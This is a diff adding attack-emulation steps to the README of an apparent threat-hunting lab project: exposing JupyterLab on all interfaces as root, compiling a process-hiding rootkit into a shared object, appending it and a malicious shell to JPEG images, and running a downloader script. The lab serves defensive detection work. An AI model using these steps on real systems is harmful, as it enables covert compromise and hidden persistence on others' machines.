@@ -22,3 +22,48 @@ The project demonstrates how to:
 - Configure Auditd rules for telemetry generation  
 - Perform threat hunting and correlation  
 - Map detections to the MITRE ATT&CK framework  
+
+### How to emulate attack
+
+1. Set up the Security Onion
+2. On Ubuntu, configure and set up the misconfigure JupyterLab
+
+```
+1️⃣ Install the venv module
+--------------------------
+apt install python3-venv
+
+2️⃣ Create a virtual environment
+-------------------------------
+python3 -m venv jupyter_env
+
+3️⃣ Activate it
+--------------
+source jupyter_env/bin/activate
+Your prompt will change to:
+(jupyter_env) root@VM:~
+
+4️⃣ Install JupyterLab
+---------------------
+pip install jupyterlab
+
+5️⃣ Run JupyterLab
+-----------------
+jupyter lab --ip=0.0.0.0 --port=8888 --no-browser --allow-root
+```
+
+3. Access remotely on kali, transfer `polygot_downloader.sh`.
+4. Set up a python server to serve the polygot images.
+5. Prepare the images:
+1. Compile the rootkit to `.so` file.
+```
+gcc -c -fPIC hideproc.c -o hideproc.o
+gcc hideproc.o -shared -o hideproc.so
+```
+2. Embed the script into the images.
+```
+cat panda.jpeg mal_shell > panda_v14
+cat panda.jpeg hideproc.so > panda_h14
+```
+6. Execute the `polygot_downloader.sh`.
+
